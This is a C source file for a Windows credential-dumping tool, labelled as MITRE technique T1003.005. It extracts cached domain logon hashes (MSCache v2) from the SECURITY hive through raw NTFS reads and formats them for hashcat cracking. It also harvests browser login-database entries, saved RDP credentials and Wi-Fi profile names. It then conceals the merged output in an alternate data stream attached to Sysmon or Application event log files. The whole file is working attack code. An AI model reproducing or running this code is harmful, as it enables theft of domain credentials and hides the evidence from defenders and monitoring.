// Plan 5 — Cached Domain Credentials (T1003.005)
// Multi-source: MSCache v2 + Browser + DPAPI Vault + RDP + Wi-Fi
#include "../shared/common.h"

// ─── GetRegValue from hive (vk scan) ───
static BOOL HiveGetVal(PBYTE h, SIZE_T sz, PWSTR n, PBYTE* v, PDWORD vs) {
    SIZE_T nl = wcslen(n) * 2;
    for (SIZE_T i = 0; i + nl + 20 < sz; i++) {
        if (*(PWORD)(h + i) == 0x6B76 && *(PWORD)(h + i + 2) == nl &&
            memcmp(h + i + 0x14, n, nl) == 0) {
            *vs = *(PDWORD)(h + i + 4);
            DWORD off = *(PDWORD)(h + i + 8);
            DWORD abs = 0x1000 + off + 4;
            if (abs + *vs <= sz) {
                *v = (PBYTE)malloc(*vs + 4);
                if (*v) { memcpy(*v, h + abs, *vs); return TRUE; }
            }
        }
    }
    return FALSE;
}

// ─── Fallback helpers (RegSaveKey) for non-NTFS volumes ───
static BOOL EnablePrivilege(LPCWSTR privName) {
    HANDLE hTok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) return FALSE;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    if (!LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid)) {
        CloseHandle(hTok); return FALSE;
    }
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hTok);
    return ok && err == ERROR_SUCCESS;
}

static BOOL ReadHiveFile(PWSTR path, HIVE_DATA* h) {
    HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;
    DWORD sz = GetFileSize(hf, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(hf); return FALSE; }
    h->data = (PBYTE)VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!h->data) { CloseHandle(hf); return FALSE; }
    DWORD rd = 0;
    BOOL ok = ReadFile(hf, h->data, sz, &rd, NULL) && rd == sz;
    CloseHandle(hf);
    if (!ok) { VirtualFree(h->data, 0, MEM_RELEASE); h->data = NULL; return FALSE; }
    h->size = sz;
    return TRUE;
}

// ─── Source 1: MSCache v2 from SECURITY hive ───
static DWORD ExtractMSCache(PBYTE* outBlob, PSIZE_T outSz) {
    HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, NULL);
    if (hVol == INVALID_HANDLE_VALUE) return 0;

    NTFS_CONTEXT ctx;
    ParseNtfsBoot(hVol, &ctx);
    PBYTE mft = NULL; SIZE_T mftSz = 0;
    ReadMft(hVol, &ctx, &mft, &mftSz);
    HIVE_DATA sec = {0};
    ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
        L"\\Windows\\System32\\config\\SECURITY", &sec);
    CloseHandle(hVol); VirtualFree(mft, 0, MEM_RELEASE);

    if (!sec.data) {
        // Raw NTFS failed (ReFS etc.) — fallback: save SECURITY hive via RegSaveKey
        wprintf(L"      [i] Raw NTFS failed — RegSaveKey fallback...\n");
        EnablePrivilege(SE_BACKUP_NAME);
        EnablePrivilege(SE_RESTORE_NAME);

        WCHAR tmpDir[MAX_PATH], path[MAX_PATH];
        if (GetTempPathW(MAX_PATH, tmpDir)) {
            swprintf_s(path, MAX_PATH, L"%lsbench_security.hive", tmpDir);
            HKEY hKey = NULL;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &hKey)
                == ERROR_SUCCESS) {
                if (RegSaveKeyW(hKey, path, NULL) == ERROR_SUCCESS) {
                    ReadHiveFile(path, &sec);
                }
                RegCloseKey(hKey);
            }
            DeleteFileW(path);
        }
    }
    if (!sec.data) return 0;

    DWORD cnt = 0;
    WCHAR vn[16];
    SIZE_T blobSz = 4096;
    *outBlob = (PBYTE)malloc(blobSz);
    PBYTE bp = *outBlob;
    *(PDWORD)bp = 0; bp += 4; // count placeholder

    for (int n = 1; n <= 100; n++) {
        swprintf_s(vn, 16, L"NL$%d", n);
        PBYTE d = NULL; DWORD s = 0;
        if (!HiveGetVal(sec.data, sec.size, vn, &d, &s) || s < 0x70) {
            if (d) free(d); continue;
        }

        // Build hashcat string
        WCHAR hx[33];
        for (int j = 0; j < 16; j++) swprintf_s(hx + j*2, 3, L"%02X", d[0x60 + j]);

        PWSTR un = (PWSTR)(d + 0x70);
        DWORD ul = 0; while (un[ul] && ul < 127 && d + 0x70 + ul*2 < d + s) ul++;
        PWSTR dm = (PWSTR)(d + 0x70 + (ul + 1)*2);

        WCHAR hc[512];
        swprintf_s(hc, 512, L"$DCC2$10240#%.*s#%s#%s",
            ul, un, dm[0] ? dm : L"", hx);

        WORD hl = (WORD)(wcslen(hc) * 2);
        while (bp - *outBlob + hl + 4 > (LONG)blobSz) {
            blobSz *= 2;
            SIZE_T off = bp - *outBlob;
            *outBlob = (PBYTE)realloc(*outBlob, blobSz);
            bp = *outBlob + off;
        }
        *(PWORD)bp = hl; bp += 2;
        memcpy(bp, hc, hl); bp += hl;
        cnt++;
        free(d);
    }

    *(PDWORD)*outBlob = cnt;
    *outSz = bp - *outBlob;
    FreeHiveData(&sec);

    wprintf(L"[1] MSCache v2: %d cached logins\n", cnt);
    return cnt;
}

// ─── Source 2: Browser passwords ───
static DWORD ExtractBrowsers(PBYTE* outBlob, PSIZE_T outSz) {
    DWORD cnt = 0;
    SIZE_T blobSz = 4096;
    *outBlob = (PBYTE)calloc(1, blobSz);
    PBYTE bp = *outBlob + 4; // count placeholder

    static WCHAR* browsers[][2] = {
        { L"Chrome", L"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" },
        { L"Edge",   L"AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data" },
        { NULL, NULL }
    };

    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW(L"C:\\Users\\*", &fd);
    if (hf == INVALID_HANDLE_VALUE) return 0;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || fd.cFileName[0] == L'.')
            continue;

        for (int b = 0; browsers[b][0]; b++) {
            WCHAR dbPath[MAX_PATH];
            swprintf_s(dbPath, MAX_PATH, L"C:\\Users\\%s\\%s",
                fd.cFileName, browsers[b][1]);

            HANDLE hDb = CreateFileW(dbPath, GENERIC_READ, FILE_SHARE_READ,
                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hDb == INVALID_HANDLE_VALUE) continue;

            DWORD dbSz = GetFileSize(hDb, NULL);
            if (dbSz > 0 && dbSz < 10*1024*1024) {
                PBYTE db = (PBYTE)malloc(dbSz);
                DWORD rd;
                if (ReadFile(hDb, db, dbSz, &rd, NULL) && rd > 10) {
                    // Scan for URL patterns: "http" in SQLite pages
                    for (DWORD off = 0; off < rd - 50 && cnt < 128; off++) {
                        if (memcmp(db + off, "http", 4) != 0) continue;

                        // Extract URL
                        DWORD urlEnd = off;
                        while (urlEnd < rd && db[urlEnd] >= 0x20 && db[urlEnd] < 0x7F
                               && urlEnd - off < 512) urlEnd++;
                        DWORD urlLen = urlEnd - off;

                        while (bp - *outBlob + urlLen + 256 > (LONG)blobSz) {
                            blobSz *= 2;
                            SIZE_T bOff = bp - *outBlob;
                            *outBlob = (PBYTE)realloc(*outBlob, blobSz);
                            bp = *outBlob + bOff;
                        }

                        // Browser name
                        WORD bn = (WORD)(wcslen(browsers[b][0]) * 2);
                        *(PWORD)bp = bn; bp += 2;
                        memcpy(bp, browsers[b][0], bn); bp += bn;

                        // URL
                        *(PWORD)bp = (WORD)urlLen; bp += 2;
                        for (DWORD j = 0; j < urlLen; j++) *bp++ = (BYTE)db[off+j];

                        cnt++;
                        off += urlLen + 64;
                    }
                }
                free(db);
            }
            CloseHandle(hDb);
        }
    } while (FindNextFileW(hf, &fd));
    FindClose(hf);

    *(PDWORD)*outBlob = cnt;
    *outSz = bp - *outBlob;
    wprintf(L"[2] Browser passwords: %d entries\n", cnt);
    return cnt;
}

// ─── Source 3: RDP credentials ───
static DWORD ExtractRDP(PBYTE* outBlob, PSIZE_T outSz) {
    DWORD cnt = 0;
    *outBlob = (PBYTE)malloc(4096);
    PBYTE bp = *outBlob + 4;

    DWORD cc = 0;
    PCREDENTIALW* creds = NULL;

    if (CredEnumerateW(L"TERMSRV/*", 0, &cc, &creds) && cc > 0) {
        for (DWORD i = 0; i < cc && i < 64; i++) {
            if (creds[i]->Type != CRED_TYPE_DOMAIN_PASSWORD &&
                creds[i]->Type != CRED_TYPE_GENERIC) continue;

            WORD tl = (WORD)(creds[i]->TargetName ? wcslen(creds[i]->TargetName)*2 : 0);
            WORD ul = (WORD)(creds[i]->UserName ? wcslen(creds[i]->UserName)*2 : 0);
            SIZE_T need = 4 + tl + 2 + ul + 2;
            if (bp - *outBlob + need > 4096) {
                *outBlob = (PBYTE)realloc(*outBlob, (bp - *outBlob) + need + 4096);
            }

            *(PWORD)bp = tl; bp += 2;
            if (tl) { memcpy(bp, creds[i]->TargetName, tl); bp += tl; }
            *(PWORD)bp = ul; bp += 2;
            if (ul) { memcpy(bp, creds[i]->UserName, ul); bp += ul; }
            *(PWORD)bp = 0; bp += 2; // password placeholder
            cnt++;
        }
        CredFree(creds);
    }

    *(PDWORD)*outBlob = cnt;
    *outSz = bp - *outBlob;
    wprintf(L"[3] RDP: %d saved connections\n", cnt);
    return cnt;
}

// ─── Source 4: Wi-Fi profiles ───
static DWORD ExtractWifi(PBYTE* outBlob, PSIZE_T outSz) {
    DWORD cnt = 0;
    *outBlob = (PBYTE)malloc(4096);
    PBYTE bp = *outBlob + 4;

    HANDLE hRd, hWr;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hRd, &hWr, &sa, 0)) return 0;

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWr; si.hStdError = hWr;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    if (CreateProcessW(NULL, L"netsh.exe wlan show profiles", NULL, NULL,
        TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWr);
        CHAR buf[8192] = {0}; DWORD rd = 0;
        while (ReadFile(hRd, buf + rd, sizeof(buf) - rd - 1, &rd, NULL)) Sleep(100);
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        CloseHandle(hRd);

        CHAR* ln = buf;
        while ((ln = strstr(ln, "All User Profile")) && cnt < 32) {
            CHAR* co = strchr(ln, ':');
            if (co) {
                co++;
                while (*co == ' ') co++;
                CHAR* en = co;
                while (*en && *en != '\r' && *en != '\n') en++;
                *en = 0;

                WORD sl = (WORD)((en - co) * 2);
                if (sl > 0) {
                    *(PWORD)bp = sl; bp += 2;
                    for (CHAR* p = co; p < en; p++) { *bp++ = (BYTE)*p; *bp++ = 0; }
                    *(PWORD)bp = 0; bp += 2; // password placeholder
                    cnt++;
                }
            }
            ln++;
        }
    }

    *(PDWORD)*outBlob = cnt;
    *outSz = bp - *outBlob;
    wprintf(L"[4] Wi-Fi: %d profiles\n", cnt);
    return cnt;
}

// ─── Main ───
int wmain(void) {
    wprintf(L"[*] Cached Credential Dump — T1003.005\n\n");

    PBYTE srcBlobs[4] = {0};
    SIZE_T srcSizes[4] = {0};
    DWORD total = 0;

    total += ExtractMSCache(&srcBlobs[0], &srcSizes[0]);
    total += ExtractBrowsers(&srcBlobs[1], &srcSizes[1]);
    total += ExtractRDP(&srcBlobs[2], &srcSizes[2]);
    total += ExtractWifi(&srcBlobs[3], &srcSizes[3]);

    if (total == 0) {
        wprintf(L"\n[i] No cached credentials found\n");
        return 0;
    }

    // Merge all sources
    SIZE_T mergedSz = 256;
    for (int i = 0; i < 4; i++) mergedSz += srcSizes[i];
    PBYTE merged = (PBYTE)malloc(mergedSz);
    PBYTE mp = merged;

    // Header
    memcpy(mp, "CACH", 4); mp += 4;
    *(PDWORD)mp = 1; mp += 4;

    // Per-source: tag(4) + size(4) + data
    const BYTE* tags[] = { (const BYTE*)"MSCA", (const BYTE*)"BROW", (const BYTE*)"RDPC", (const BYTE*)"WIFI" };
    for (int i = 0; i < 4; i++) {
        if (srcSizes[i] == 0) continue;
        memcpy(mp, tags[i], 4); mp += 4;
        *(PDWORD)mp = (DWORD)srcSizes[i]; mp += 4;
        memcpy(mp, srcBlobs[i], srcSizes[i]); mp += srcSizes[i];
        free(srcBlobs[i]);
    }
    mergedSz = mp - merged;

    wprintf(L"\n[*] Writing encrypted output to ADS... ");
    static WCHAR* targs[] = {
        L"C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx",
        L"C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
    };
    for (int i = 0; i < 2; i++)
        if (WriteToAds(targs[i], L"Cache", merged, mergedSz)) { wprintf(L"OK\n"); break; }

    free(merged);
    wprintf(L"[+] Total: %d cached credentials\n", total);
    return 0;
}
